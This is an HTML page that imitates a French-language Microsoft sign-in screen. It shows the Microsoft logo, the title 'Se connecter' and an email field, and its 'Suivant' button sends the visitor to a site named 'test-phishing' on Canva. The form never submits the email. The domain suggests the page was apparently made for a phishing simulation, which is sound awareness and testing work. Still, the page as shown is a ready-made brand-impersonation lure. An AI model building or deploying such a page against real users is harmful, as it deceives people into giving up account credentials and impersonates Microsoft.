<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Se connecter</title>
    <style>
        @font-face {
            font-family: 'Segoe UI';
            src: local('Segoe UI'), local('SegoeUI'), url('https://fonts.cdnfonts.com/css/segoe-ui');
        }
        body {
            margin: 0;
            background: url('https://mistralaichatupprodswe.blob.core.windows.net/chat-images/db/56/68/db566878-b2ff-428c-b490-14560fc30eb9/b3062a06-ed3b-428c-997b-cc22aa88579a/316826a7-c180-44f1-b28b-3bdd3da95646') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .login-container {
            background: white;
            padding: 40px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
            text-align: left;
        }
        .login-header {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
        }
        .login-header img {
            width: 24px;
            height: 24px;
            margin-right: 8px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-control {
            border: none;
            border-bottom: 1px solid #ccc;
            border-radius: 0;
            padding: 10px 0;
            font-size: 16px;
            width: 100%;
            box-sizing: border-box;
        }
        .form-control:focus {
            border-bottom: 2px solid #0078d4;
            outline: none;
        }
        .button-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 20px;
        }
        .btn-next {
            background: #0067b8;
            color: white;
            border: none;
            border-radius: 0;
            padding: 8px 20px;
            font-size: 16px;
            cursor: pointer;
            width: 100px;
        }
        .horizontal-links {
            margin-top: 20px;
            font-size: 14px;
        }
        .horizontal-links a {
            color: #0067b8;
            text-decoration: none;
        }
        .horizontal-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
            <h2>Se connecter</h2>
        </div>

        <form autocomplete="off">
            <div class="form-group">
                <input type="email" class="form-control" id="email" placeholder="E-mail, téléphone ou identifiant Skype" required>
            </div>

            <div class="horizontal-links">
                <p>Pas de compte ? <a href="#">Créez-en un !</a></p>
                <p><a href="#">Votre compte n’est pas accessible ?</a></p>
            </div>

            <div class="button-container">
                <button type="button" class="btn-next" onclick="window.location.href='https://test-phishing.my.canva.site'">Suivant</button>
            </div>
        </form>
    </div>
</body>
</html>
